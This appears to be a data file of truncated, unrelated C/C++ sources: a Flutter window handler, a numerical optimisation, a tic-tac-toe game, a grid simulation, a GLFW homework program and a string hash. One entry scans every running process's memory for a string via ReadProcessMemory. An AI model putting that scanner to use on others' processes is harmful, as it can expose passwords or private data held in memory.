UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <intrin.h>\n#include <memory>\n#include <algorithm>\n#include <vector>\n#include <functional>\n#include <string>\n#include <iostream>\n#include <windows.h>\n#include <psapi.h>\n\n#define cpuid(info, x)    __cpuidex(info, x, 0)\n\ninline void __intr(BOOL& _SSE, BOOL& _AVX, BOOL& _AVX512) {\n    int info[4];\n    cpuid(info, 0);\n    int nIds = info[0];\n\n    cpuid(info, 0x80000000);\n\n    _SSE = _AVX = _AVX512 = 0;\n\n    if (nIds >= 0x00000001) {\n        cpuid(info, 0x00000001);\n        _SSE = (info[3] & ((int)1 << 25)) != 0;\n        _AVX = (info[2] & ((int)1 << 28)) != 0;\n    }\n\n    if (nIds >= 0x00000007) {\n        cpuid(info, 0x00000007);\n        _AVX512 = (info[1] & ((int)1 << 16)) != 0;\n    }\n}\n\n__forceinline void RPM(const std::string& __str, BOOL SSE, BOOL AVX, BOOL AVX512) {\n    /*\n    push ebp\n        mov ebp, esp\n        sub esp, __LOCAL_SIZE\n        push ebx\n        push esi\n        push edi\n\n    */\n    DWORD p[1024], n, j;\n    if (!K32EnumProcesses(p, sizeof(p), &n)) {\n        std::cerr << \"Failed to enumerate all processes in the system.\" << std::endl;\n        return;\n    }\n    j = n / sizeof(DWORD);\n    DWORD _p = GetCurrentProcessId();\n\n    // My custom KMP algorithm\n    std::vector<int> lps(__str.size(), 0);\n    int len = 0;\n    for (size_t i = 1; i < __str.size();) {\n        if (__str[i] == __str[len]) {\n            len++;\n            lps[i] = len;\n            i++;\n        }\n        else {\n            if (len != 0) {\n                len = lps[static_cast<std::vector<int, std::allocator<int>>::size_type>(len) - 1];\n            }\n            else {\n                lps[i] = 0;\n                i++;\n            }\n        }\n    }\n\n    for (DWORD i = 0; i < j; i++) {\n        DWORD __p = p[i];\n        if (__p == 0 || __p == 4 || __p == 140 || __p == 104 || __p == _p) {\n            continue;\n        }\n\n        HANDLE h = OpenProcess((0x0400) | (0x0010), 0, __p);\n        if (h != 0) {\n            printf(\"Scanning Process: %d\\n\", __p);\n\n            SYSTEM_INFO s;\n            GetSystemInfo(&s);\n            MEMORY_BASIC_INFORMATION z{};\n            BOOL x = 0;\n\n            for (LPVOID addr = s.lpMinimumApplicationAddress; addr < s.lpMaximumApplicationAddress;\n                addr = (LPBYTE)z.BaseAddress + z.RegionSize) {\n                if (VirtualQueryEx(h, addr, &z, sizeof(z)) == sizeof(z)) {\n                    if (z.State == 0x00001000 && !(z.Protect & 0x100) && !(z.Protect & 0x01)) {\n                        std::vector<char> n(z.RegionSize);\n                        SIZE_T r;\n\n                        if (ReadProcessMemory(h, z.BaseAddress, n.data(), z.RegionSize, &r)) {\n                            char* dataPtr = n.data();\n                            if (AVX512) {\n                                const size_t z = __str.size();\n                                const size_t s = 64;\n\n                                size_t __avx512 = (r - z) / s;\n\n                                __m512i cmp = _mm512_loadu_epi32(reinterpret_cast<const __m512i*>(__str.c_str()));\n\n                                for (size_t i = 0; i < __avx512; ++i) {\n                                    __m512i data = _mm512_loadu_epi32(reinterpret_cast<const __m512i*>(dataPtr + i * s));\n\n                                    size_t j = 0;\n                                    while (j < s) {\n                                        __m512i cmpData = _mm512_loadu_epi32(reinterpret_cast<const __m512i*>(dataPtr + i * s + j));\n                                        __mmask64 m = _mm512_cmpeq_epu8_mask(cmpData, cmp);\n\n                                        if (m != 0) {\n                                            size_t k = 0; \n                                            /*\n                                            If you want to only search for ASCII characters:\n                                            if (dataPtr[i * s + j] >= 32 && dataPtr[i * s + j] <= 126) {\n                                            */\n                                            for (; k < z; ++k) {\n                                                if (dataPtr[i * s + j + k] != __str[k]) {\n                                                    break;\n                                                }\n                                            }\n                                            if (k == z) {\n                                                printf(\"[+] String detected in %d\\n\", __p);\n                                                x = 1;\n                                                break;\n                                            }\n                                            j += k - lps[k - 1];\n                                        }\n                                        else {\n                                            ++j;\n                                        }\n                                    }\n                                }\n                            }\n                            else if (AVX) {\n                                const size_t z = __str.si",
    "#include <iostream>\n#include <fstream>\n#include <cmath>\n#include <vector>\n#include <string>\n#include <valarray>\n#include <iomanip>\n#include<fstream>\n\n\nusing namespace std;\nusing std:: ofstream;\n\n\n\ndouble M1=0;\ndouble M2 =6;\n\ndouble tfun(double t,double x0,double x1,double x2,double x3,double x4,double x5, double xt){\n   return (t*t*t*t*t*(x5-5*x4+10*x3-10*x2+5*x1-x0)+t*t*t*t*(5*x4-20*x3+30*x2-20*x1+5*x0)+t*t*t*(10*x3-30*x2+30*x1-10*x0)+t*t*(10*x2-20*x1+10*x0)+t*(5*x1-5*x0)+x0)-xt;\n};\ndouble dtfun(double t, double x0,double x1,double x2,double x3,double x4,double x5){\n  return  5*t*t*t*t*(x5-5*x4+10*x3-10*x2+5*x1-x0)+4*t*t*t*(5*x4-20*x3+30*x2-20*x1+5*x0)+3*t*t*(10*x3-30*x2+30*x1-10*x0)+2*t*(10*x2-20*x1+10*x0)+5*x1-5*x0;\n};\n\ndouble newton(double t0, double er, int nmax, double tr, double ea, double fr,double x0,double x1,double x2,double x3,double x4,double x5,double xt)\n{\n//--  initial values\n    int niter=0;\n    double told = t0;\n    fr=tfun(told, x0, x1, x2,x3,x4,x5,xt);\n//\n//___start of iterations __________\n//\n   // cout<<\" niter tr ea fr\\n\";\n    for(niter;niter<nmax;niter++)\n    {\n\n        double fgr = dtfun(told,x0,x1,x2,x3,x4,x5);\n        if(fgr!=0)\n        {\n            tr = told - fr/fgr;\n        }\n        else\n        {\n            cout<<\"error!  zero derivative\"<<endl;\n            return 0;\n        }\n//-- xr is a roote?\n        fr=tfun(tr,x0,x1,x2,x3,x4,x5,xt);\n        if(fr==0)\n        {\n            ea=0;\n          return tr;\n        }\n//-- relatice (or absolute) error\n        if(tr!=0)\n        {\n            ea = fabs((tr-told)/tr);\n        }\n        else\n        {\n            ea = fabs(tr-told);\n        }\n//-- monitoring (optional)\n     //   cout<<niter<<\" \"<<tr<<\" \"<<ea<<\" \"<<fr<<\"\\n\";\n//-- exit checks\n        if(ea<=er)\treturn tr;\n        if(niter>=nmax)\n        {\n            cout<<\"warning! iterations limit\"<<endl;\n            return 0;\n        }\n        told=tr;\n    }\n    return tr;\n}\n\n\ndouble S (double t,double b0,double b1,double b2,double b3,double b4,double b5){\n\n  return t*t*t*t*t*(b5-5*b4+10*b3-10*b2+5*b1-b0)+t*t*t*t*(5*b4-20*b3+30*b2-20*b1+5*b0)+t*t*t*(10*b3-30*b2+30*b1-10*b0)+t*t*(10*b2-20*b1+10*b0)+t*(5*b1-5*b0)+b0;\n};\n\ndouble fun(double T, double x,double S){\n    return 0.01*T*T*S -32*x ;\n\n}\n\n\ndouble F(double T, double T0){\n    double obj=T-T0;\n    return pow(obj,2);\n}\n\ndouble trap(int n, vector <double> xg, vector <double> Tg, double &sum)\n{\n    sum=0.e0;\n    for(int i=1;i<n+1;i++)\n    {\n        if(xg[i]<xg[i-1])\n        {\n            cout<<\"x NOT in INCREASING order\"<<endl;\n            break;\n        }\n        sum=sum+.5e0*(xg[i]-xg[i-1])*(Tg[i]+Tg[i-1]);\n    }\n    return sum ;\n}\n\ndouble Fb1fun(double t){\n    return 5*t*t*t*t*t-20*t*t*t*t+30*t*t*t-20*t*t+5*t;\n}\n\ndouble Fb2fun(double t){\n    return -10*t*t*t*t*t+30*t*t*t*t-30*t*t*t+10*t*t;\n}\n\ndouble Fb3fun(double t){\n    return 10*t*t*t*t*t-20*t*t*t*t+10*t*t*t;\n}\n\ndouble Fb4fun(double t){\n    return -5*t*t*t*t*t+5*t*t*t*t;\n}\n\ndouble fae(double Tf,double T0,double S,double Psi){\n    return 2*(Tf-T0)-0.02*Tf*S*Psi;\n}\n\nvoid tdma(vector<double> &a, vector<double> &b,vector<double> &c,vector<double> &d,int n){\n    n--;\n    c[0] /= b[0];\n    d[0] /= b[0];\n\n    for (int i = 1; i < n; i++) {\n        c[i] /= b[i] - a[i]*c[i-1];\n        d[i] = (d[i] - a[i]*d[i-1]) / (b[i] - a[i]*c[i-1]);\n    }\n\n    d[n] = (d[n] - a[n]*d[n-1]) / (b[n] - a[n]*c[n-1]);\n\n    for (int i = n; i-- > 0;) {\n        d[i] -= c[i]*d[i+1];\n    }\n}\n\n\ndouble DirectDif(double T,double DerivTb,double y,double DerivS,double x){\n    return 0.02*T*DerivTb*y+0.01*T*T*DerivS-32*x;\n}\n\n\nint main() {\n     ofstream fdL;\n     ofstream fd1;\n     ofstream fd2;\n     ofstream fd3;\n     ofstream fd4;\n    double dx;\n    double L =4;\n    int n=200;\n   vector<double> T(1), aux(3), x(n+1),taf(n+1),Ttot(n+1),y(n+1),Tg(n+1),Psi(n+1),tempPsi(1),termLfun(n+1),deltaFL(2),termxfun(n+1),deltaFb1(2);\n   vector<double> termS1fun(n+1),termS2fun(n+1),termS3fun(n+1),termS4fun(n+1),derivFb1(n+1),derivFb2(n+1),derivFb3(n+1),derivFb4(n+1),deltaFb2(2),deltaFb3(2),deltaFb4(2);\n   vector<double> TL(1),Tc1(1),Tc2(1),Tc3(1),Tc4(1), TtL(n+1),Ttc1(n+1),Ttc2(n+1),Ttc3(n+1),Ttc4(n+1),TgL(n+1),Tgc1(n+1),Tgc2(n+1),Tgc3(n+1),Tgc4(n+1),tafn(n+1),xn(n+1);\n    vector<double>TLm(1),Tc1m(1),Tc2m(1),Tc3m(1),Tc4m(1), TtLm(n+1),Ttc1m(n+1),Ttc2m(n+1),Ttc3m(n+1),Ttc4m(n+1),TgLm(n+1),Tgc1m(n+1),Tgc2m(n+1),Tgc3m(n+1),Tgc4m(n+1),tafnm(n+1),xnm(n+1);\n   double dRdb[n+1][4], dFdb[1][4], dTdb[n+1][4],dRdT[n+1][n+1],dFdbnew[1][4];\n   vector<double> DirTb1(n+1,0),DirTb2(n+1,0),DirTb3(n+1,0),DirTb4(n+1,0),tempDirTb1(1),tempDirTb2(1),tempDirTb3(1),tempDirTb4(1),DDfb1(n+1),DDfb2(n+1),DDfb3(n+1),DDfb4(n+1);\n   vector<double> b(n+1),a(n+1),c(n+1),d(n+1),bF(n+1),aF(n+1),cF(n+1),dF(n+1),dF2(n+1),dF3(n+1),dF4(n+1);\n    vector<double> bF2(n+1),aF2(n+1),cF2(n+1),bF3(n+1),aF3(n+1),cF3(n+1),bF4(n+1),aF4(n+1),cF4(n+1);\n   vector<double> dTdb1(n+1),dTdb2(n+1),dTdb3(n+1),dTdb4(n+1), dFdb1(n+1),dFdb2(n+1),dFdb3(n+1),dFdb4(n+1),dFdT(n+1),dRb1(n+1),dRb2(",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string>\n#include <iostream>\n\nusing namespace std;\n\n\n//Functions Header\nvoid fMainMenu();\nvoid fGameScreen();\n\n\n//Function: Cleans Terminal\nvoid fScreenCleaner()\n{\n\tsystem(\"CLS\");\n}\n\n\n//Function: Ends Terminal\nvoid fExitGame()\n{\n\texit(0);\n}\n\n\n//Function: About the Game Screen\nvoid fAboutScreen()\n{\nfScreenCleaner();\nint iOption = 0;\nwhile (iOption == 0)\n{\n\tcout << \"!!!!ABOUT!!\\n\";\n\tcout << \"!!!!THE!!!!\\n\";\n\tcout << \"!!!!GAME!!!\\n\\n\";\n\tcout << \"This is a Game of Tic-Tac-Toe in which you play against another player to score marks in a row, column or diagonaly.\\n\";\n\tcout << \"By Succesfully scoring in one of those three ways, you will be declared the Winner of the Match.\\n\";\n\tcout << \"This is a Game made for Studying purposes\\n\\n\";\n\tcout << \"Credits: Jefferson Souza aka Sarmyte\\n\\n\";\n\tcout << \"Input 1 to go Back to the Main Menu: \\n\";\n\tcin >> iOption;\n}\n\nfMainMenu();\n\n}\n\n\n//Function: Checks Rows, Columns and Diagonals to determine a Winner and Prints the Winner on the Screen\nvoid fGameWinnerCheckandScreen(char cBoard[3][3],int iPlayerTurn)\n{\n\tint iBoardRows, iBoardColumns;\n\n\t//Checking for Game Winner and Winner Screen.\n\tfor (iBoardRows = 0; iBoardRows < 3; iBoardRows++)\n\t{\n\t\tif (cBoard[iBoardRows][0] != '-' && cBoard[iBoardRows][0] == cBoard[iBoardRows][1] && cBoard[iBoardRows][1] == cBoard[iBoardRows][2])\n\t\t{\n\t\t\tfScreenCleaner();\n\t\t\tint iOptions = 0;\n\t\t\twhile (iOptions == 0)\n\t\t\t{\n\t\t\t\tif (cBoard[iBoardRows][0] == 'X')\n\t\t\t\t{\n\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\tcout << \"!!!!!PLAYER-ONE!!!!!!\\n\";\n\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\tif (cBoard[iBoardRows][0] == 'O')\n\t\t\t\t{\n\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\tcout << \"!!!!!PLAYER-TWO!!!!!!\\n\";\n\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t}\n\n\n\t\t\t\tcout << \"Choose an Option:\\n\";\n\t\t\t\tcout << \"1 - Play Again\\n\";\n\t\t\t\tcout << \"2 - Main Menu\\n\";\n\t\t\t\tcout << \"3 - Exit the Game\\n\";\n\n\t\t\t\tcin >> iOptions;\n\n\t\t\t\tswitch (iOptions)\n\t\t\t\t{\n\t\t\t\tcase 1:\n\t\t\t\t\tfGameScreen();\n\t\t\t\t\tbreak;\n\t\t\t\tcase 2:\n\t\t\t\t\tfMainMenu();\n\t\t\t\t\tbreak;\n\t\t\t\tcase 3:\n\t\t\t\t\tcout << \"See You Later\";\n\t\t\t\t\tfExitGame();\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t}\n\t}\n\tfor (iBoardColumns = 0; iBoardColumns < 3; iBoardColumns++)\n\t{\n\t\tif (cBoard[0][iBoardColumns] != '-' && cBoard[0][iBoardColumns] == cBoard[1][iBoardColumns] && cBoard[1][iBoardColumns] == cBoard[2][iBoardColumns])\n\t\t{\n\t\t\tfScreenCleaner();\n\t\t\tint iOptions = 0;\n\t\t\twhile (iOptions == 0)\n\t\t\t{\n\t\t\t\tif (cBoard[0][iBoardColumns] == 'X')\n\t\t\t\t{\n\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\tcout << \"!!!!!PLAYER-ONE!!!!!!\\n\";\n\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\tif (cBoard[0][iBoardColumns] == 'O')\n\t\t\t\t\t{\n\t\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\t\tcout << \"!!!!!PLAYER-TWO!!!!!!\\n\";\n\t\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t\t}\n\n\n\t\t\t\tcout << \"Choose an Option:\\n\";\n\t\t\t\tcout << \"1 - Play Again\\n\";\n\t\t\t\tcout << \"2 - Main Menu\\n\";\n\t\t\t\tcout << \"3 - Exit the Game\\n\";\n\n\t\t\t\tcin >> iOptions;\n\n\t\t\t\tswitch (iOptions)\n\t\t\t\t{\n\t\t\t\tcase 1:\n\t\t\t\t\tfGameScreen();\n\t\t\t\t\tbreak;\n\t\t\t\tcase 2:\n\t\t\t\t\tfMainMenu();\n\t\t\t\t\tbreak;\n\t\t\t\tcase 3:\n\t\t\t\t\tcout << \"See You Later\";\n\t\t\t\t\tfExitGame();\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tif (cBoard[0][0] != '-' && cBoard[0][0] == cBoard[1][1] && cBoard[1][1] == cBoard[2][2] || cBoard[0][2] != '-' && cBoard[0][2] == cBoard[1][1] && cBoard[1][1] == cBoard[2][0])\n\t{\n\t\tfScreenCleaner();\n\t\tint iOptions = 0;\n\t\twhile (iOptions == 0)\n\t\t{\n\t\t\tif (cBoard[1][1] == 'X')\n\t\t\t{\n\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\tcout << \"!!!!!PLAYER-ONE!!!!!!\\n\";\n\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t}\n\t\t\telse\n\t\t\t\tif (cBoard[1][1] == 'O')\n\t\t\t\t{\n\t\t\t\t\tcout << \"!!!CONGRATULATIONS!!!\\n\";\n\t\t\t\t\tcout << \"!!!!!PLAYER-TWO!!!!!!\\n\";\n\t\t\t\t\tcout << \"!!!!WON THE GAME!!!!!\\n\\n\";\n\t\t\t\t}\n\n\n\t\t\tcout << \"Choose an Option:\\n\";\n\t\t\tcout << \"1 - Play Again\\n\";\n\t\t\tcout << \"2 - Main Menu\\n\";\n\t\t\tcout << \"3 - Exit the Game\\n\";\n\n\t\t\tcin >> iOptions;\n\n\t\t\tswitch (iOptions)\n\t\t\t{\n\t\t\tcase 1:\n\t\t\t\tfGameScreen();\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tfMainMenu();\n\t\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\t\tcout << \"See You Later\";\n\t\t\t\tfExitGame();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n}\n//Function: Displays Current player Turn and Message to check if the selected place marked is still valid to mark\nvoid fGameSystemMessages(int iPlayerTurn, string sGameFeedbackMessage)\n{\n\tif (iPlayerTurn == 1)\n\t{\n\t\tcout << sGameFeedbackMessage << \"\\n\";\n\t\tcout << \"Player Turn: 01 \\n\\n\";\n\t}\n\telse\n\t{\n\t\tcout << sGameFeedbackMessage << \"\\n\";\n\t\tcout << \"Player Turn: 02 \\n\\n\";\n\t}\n}\n//Function: Prints the Game Board on Screen\nvoid fGameBoard(char cBoard[3][3])\n{\n\tint iBoardRows, iBoardColumns;\n\tint iCounter = 0;\n\tstring sRows = \"Rows\";\n\tcout << \"       Columns\\n\" << \"      0   1   2\\n\\n\";\n\n\t\tfor (iBoardRows = 0; iBoardRows <= 3; iBoardRows++)\n\t\t{\n\t\t\tif (iCounter < 4)\n\t\t\t{\n\t\t\t\tcout << sRows[iCounter] << \"  \";\n\t\t\t\tiCounter++;\n\t\t\t}\n\t\t\tif (iBoardRows < 3)\n\t\t\t{\t\n\t\t\t\tif (iBoardRows == 2)\n\t\t\t\t\t{\n\t\t\t\t\t\tcout << \"   \";\n\t\t\t\t\t}\n\t\t\t\tcout << iBoardRows << \" \";\n\n\t\t\t\tfor (iBoardColumns = 0; iBoardColumns < 3; iB",
    "// #include <iostream>\n// #include <cmath>\n// #include <tuple>\n// using namespace std;\n// // pair<int,int> pos[31];\n// #define X first\n// #define Y second\n// bool rest[31];\n// int arr[51][51];\n// int dis[31];\n// vector<tuple<int,int,int>> pos;\n// int dx[8]=[1,-1,0,0,-1,-1,1,1];\n// int dy[8]=[0,0,1,-1,-1,1,-1,1];\n\n// int getDis(pair<int,int> x, pair<int,int> y) {\n//     return pow(x.X-y.X,2)+pow(x.Y-y.Y,2);\n// }\n\n// int main() {\n//     int n,m,p,c,d;\n//     cin>>n>>m>>p>>c>>d;\n//     int r_x,c_y;\n//     cin>>r_x>>c_y;\n//     arr[r_x][c_y]=2; //\ub8e8\ub3cc\ud504 \uc704\uce58\n//     for(int i=1;i<=p;i++) {\n//         int idx,x,y,d;\n//         cin>>idx>>x>>y;\n//         arr[x][y]=1; //\uc0b0\ud0c0 \uc704\uce58\n//         d=getDis({x,y},{r_x,c_y});\n//         tuple<int,int,int> tup=make_tuple(d,x,y);\n//         pos.push_back(tup);\n//         tie(d,x,y)=tup;\n//         // cout<<d<<' '<<x<<' '<<y<<'\\n';\n\n//     }\n//     sort(pos.begin(),pos.end());\n//     int mind=5000;\n//     while(m--) {\n//         for(int i=0;i<8;i++) {\n//             int nx=r_x+dx[i];\n//             int ny=r_y+dy[i];\n//             if(nx<=0||ny<=0||nx>n||ny>n) continue;\n//             int dist=getDis({nx,ny},pos[0]);\n//             if(mind>dist) {\n//                 mind=dist;\n\n//             }\n//             mind=min(mind,getDis({nx,ny},pos[0]));\n//         }\n//     }\n\n\n\n//     return 0;\n// }\n\n#include <iostream>\n\nusing namespace std;\n\n#define MAX_N 51\n#define MAX_P 31\n\nint n, m, p, c, d;\nint points[MAX_P];\npair<int, int> pos[MAX_P];\npair<int, int> rudolf;\n\nint board[MAX_N][MAX_N];\nbool is_live[MAX_P];\nint stun[MAX_P];\n\nconst int dx[4] = {-1, 0, 1, 0};\nconst int dy[4] = {0, 1, 0, -1};\n\nbool is_inrange(int x, int y) {\n    return 1 <= x && x <= n && 1 <= y && y <= n;\n}\n\nint main() {\n    cin >> n >> m >> p >> c >> d; \n    cin >> rudolf.first >> rudolf.second;\n    board[rudolf.first][rudolf.second] = -1;  \n\n    for(int i = 1; i <= p; i++) {\n        int id;\n        cin >> id;\n        cin >> pos[id].first >> pos[id].second;\n        board[pos[id].first][pos[id].second] = id; \n        is_live[id] = true;  \n    }\n\n    for(int t = 1; t <= m; t++) {\n        int closestX = 10000, closestY = 10000, closestIdx = 0;\n\n        for(int i = 1; i <= p; i++) {\n            if(!is_live[i]) continue;\n\n            pair<int, pair<int, int>> currentBest = { (closestX - rudolf.first) * (closestX - rudolf.first) + (closestY - rudolf.second) * (closestY - rudolf.second), {-closestX, -closestY}};\n            pair<int, pair<int, int>> currentValue = {(pos[i].first - rudolf.first) * (pos[i].first - rudolf.first) + (pos[i].second - rudolf.second) * (pos[i].second - rudolf.second), {-pos[i].first, -pos[i].second}};\n            \n            if(currentValue < currentBest) {\n                closestX = pos[i].first;\n                closestY = pos[i].second;\n                closestIdx = i;\n            }\n        }\n\n        \n        if(closestIdx) {\n            pair<int, int> prevRudolf = rudolf;\n            int moveX = 0;\n            if(closestX > rudolf.first) moveX = 1;\n            else if(closestX < rudolf.first) moveX = -1;\n\n            int moveY = 0;\n            if(closestY > rudolf.second) moveY = 1;\n            else if(closestY < rudolf.second) moveY = -1;\n\n            rudolf.first += moveX;\n            rudolf.second += moveY;\n            board[prevRudolf.first][prevRudolf.second] = 0;\n\n            if(rudolf.first == closestX && rudolf.second == closestY) {\n                int firstX = closestX + moveX * c;\n                int firstY = closestY + moveY * c;\n                int lastX = firstX;\n                int lastY = firstY;\n\n                stun[closestIdx] = t + 1;\n\n                while(is_inrange(lastX, lastY) and board[lastX][lastY] > 0) {\n                    lastX += moveX;\n                    lastY += moveY;\n                }\n                \n                while(!(lastX == firstX and lastY == firstY)) {\n                    int beforeX = lastX - moveX;\n                    int beforeY = lastY - moveY;\n\n                    if(!is_inrange(beforeX, beforeY)) break;\n\n                    int idx = board[beforeX][beforeY];\n\n                    if(!is_inrange(lastX, lastY)) {\n                        is_live[idx] = false;\n                    }\n                    else {\n                        board[lastX][lastY] = board[beforeX][beforeY];\n                        pos[idx] = {lastX, lastY};\n                    }\n\n                    lastX = beforeX;\n                    lastY = beforeY;\n                }\n\n                points[closestIdx] += c;\n                pos[closestIdx] = {firstX, firstY};\n                if(is_inrange(firstX, firstY)) {\n                    board[firstX][firstY] = closestIdx;\n                }\n                else {\n                    is_live[closestIdx] = false;\n                }\n            }\n        }\n\n        board[rudolf.first][rudolf.second] = -1;\n\n        for(int i = 1; i <= p; i++) {\n            if(!is_live[i] || stun[i] >= t) continue;\n\n            int minDist = (pos[i].first - rudolf.",
    "\ufeff//\uacfc\uc81c\ubb3c \ud504\ub85c\uc81d\ud2b8\uba85: Lecture04_HW\n//idle : \ud654\uba74\uc0c9 \uac80\uc815\uc0c9\uc73c\ub85c clear\n//\ub9c8\uc6b0\uc2a4 \uc624\ub978\ucabd KeyDown\ud558\uba74 : \ube68\uac04\uc0c9\n//\ub9c8\uc6b0\uc2a4 \uc624\ub978\ucabd KeyUp\ud558\uba74 : \uc6d0\uc0c1\ubcf5\uad6c\n//\ub9c8\uc6b0\uc2a4 \uc67c\ucabd KeyDown\ud558\uba74 : \ub179\uc0c9\n//\ub9c8\uc6b0\uc2a4 \uc67c\ucabd KeyUp\ud558\uba74 : \uc6d0\uc0c1\ubcf5\uad6c\n//\ub9c8\uc6b0\uc2a4 \uc624\ub978\ucabd KeyDown\ud558\uace0 \ub4dc\ub798\uadf8 \uc911\uc774\uba74 : \ud30c\ub791\uc0c9\n//\ub9c8\uc6b0\uc2a4 \uc67c\ucabd KeyDown\ud558\uace0 \ub4dc\ub798\uadf8 \uc911\uc774\uba74 : \ub9c8\uc820\ud0c0\uc0c9\n\n//https://www.glfw.org/\n#pragma comment(lib, \"Opengl32.lib\")\n#include <GLFW/glfw3.h>\n#include <iostream>\n\nbool leftMouseDown = false;\nbool rightMouseDown = false;\nbool draggingLeft = false;\nbool draggingRight = false;\n\nvoid errorCallback(int error, const char* description)\n{\n    std::cerr << \"GLFW Error: \" << description << std::endl;\n}\n\nvoid keyCallback(GLFWwindow* window, int key, int scancode, int action, int mods)\n{\n    if (key == GLFW_KEY_ESCAPE && action == GLFW_PRESS)\n    {\n        glfwSetWindowShouldClose(window, GLFW_TRUE);\n    }\n}\n\nvoid mouseButtonCallback(GLFWwindow* window, int button, int action, int mods)\n{\n    if (button == GLFW_MOUSE_BUTTON_LEFT)\n    {\n        if (action == GLFW_PRESS)\n        {\n            leftMouseDown = true;\n            draggingLeft = true;\n            glClearColor(0.0f, 1.0f, 0.0f, 1.0f); // Green background color\n        }\n        else if (action == GLFW_RELEASE)\n        {\n            leftMouseDown = false;\n            draggingLeft = false;\n            glClearColor(0.0f, 0.0f, 0.0f, 1.0f); // Default background color\n        }\n    }\n    else if (button == GLFW_MOUSE_BUTTON_RIGHT)\n    {\n        if (action == GLFW_PRESS)\n        {\n            rightMouseDown = true;\n            draggingRight = true;\n            glClearColor(1.0f, 0.0f, 0.0f, 1.0f); // Red background color\n        }\n        else if (action == GLFW_RELEASE)\n        {\n            rightMouseDown = false;\n            draggingRight = false;\n            glClearColor(0.0f, 0.0f, 0.0f, 1.0f); // Default background color\n        }\n    }\n\n    glClear(GL_COLOR_BUFFER_BIT);\n    glfwSwapBuffers(window);\n}\n\nvoid cursorPosCallback(GLFWwindow* window, double xpos, double ypos)\n{\n    if (draggingLeft)\n    {\n        glClearColor(1.0f, 0.0f, 1.0f, 1.0f); // Magenta background color\n    }\n    else if (draggingRight)\n    {\n        glClearColor(0.0f, 0.0f, 1.0f, 1.0f); // Blue background color\n    }\n    else if (leftMouseDown)\n    {\n        glClearColor(0.0f, 1.0f, 0.0f, 1.0f); // Green background color\n    }\n    else if (rightMouseDown)\n    {\n        glClearColor(1.0f, 0.0f, 0.0f, 1.0f); // Red background color\n    }\n    else\n    {\n        glClearColor(0.0f, 0.0f, 0.0f, 1.0f); // Default background color\n    }\n\n    glClear(GL_COLOR_BUFFER_BIT);\n    glfwSwapBuffers(window);\n}\n\nvoid mouseDragCallback(GLFWwindow* window, double xpos, double ypos)\n{\n    // Check if the left mouse button is pressed and dragging\n    if (glfwGetMouseButton(window, GLFW_MOUSE_BUTTON_LEFT) == GLFW_PRESS)\n    {\n        draggingLeft = true;\n    }\n    else\n    {\n        draggingLeft = false;\n        if (leftMouseDown) {\n            glClearColor(0.0f, 1.0f, 0.0f, 1.0f); // Green background color\n        }\n    }\n\n    // Check if the right mouse button is pressed and dragging\n    if (glfwGetMouseButton(window, GLFW_MOUSE_BUTTON_RIGHT) == GLFW_PRESS)\n    {\n        draggingRight = true;\n    }\n    else\n    {\n        draggingRight = false;\n        if (rightMouseDown) {\n            glClearColor(1.0f, 0.0f, 0.0f, 1.0f); // Red background color\n        }\n    }\n}\n\nint main(void)\n{\n    if (!glfwInit())\n        return -1;\n\n    GLFWwindow* window;\n    window = glfwCreateWindow(1280, 768, \"Lecture04_HW\", NULL, NULL);\n\n    if (!window)\n    {\n        glfwTerminate();\n        return -1;\n    }\n\n    glfwMakeContextCurrent(window);\n    glfwSetErrorCallback(errorCallback);\n    glfwSetKeyCallback(window, keyCallback);\n    glfwSetMouseButtonCallback(window, mouseButtonCallback);\n    glfwSetCursorPosCallback(window, cursorPosCallback);\n\n    while (!glfwWindowShouldClose(window))\n    {\n        glfwPollEvents();\n    }\n\n    glfwTerminate();\n    return 0;\n}",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nvoid rotate(vector<int> &arr)\n{\n    int last_element = arr.back();\n    arr.pop_back();\n    arr.insert(arr.begin(), last_element);\n}\n\nstring isomorphMatrix(string s)\n{\n    int sizeOfString = s.size();\n    vector<int> temp;\n    map<char, int> charMap;\n    int uniqueCharCount = 0;\n    for (char c : s)\n    {\n        if (charMap.find(c) == charMap.end())\n        {\n            charMap[c] = uniqueCharCount++;\n        }\n        temp.push_back(charMap[c]);\n    }\n\n    vector<vector<int>> tempArr(sizeOfString, vector<int>(sizeOfString));\n\n    for (int i = 0; i < sizeOfString; i++)\n    {\n        for (int j = 0; j < sizeOfString; j++)\n        {\n            tempArr[i][j] = temp[j];\n        }\n        rotate(temp);\n    }\n\n    string matrixString = s;\n    for (int i = 0; i < sizeOfString; i++)\n    {\n        for (int j = 0; j < sizeOfString; j++)\n        {\n            matrixString += to_string(tempArr[i][j]);\n        }\n    }\n\n    return matrixString;\n}\n\nsize_t calcHash(string s)\n{\n    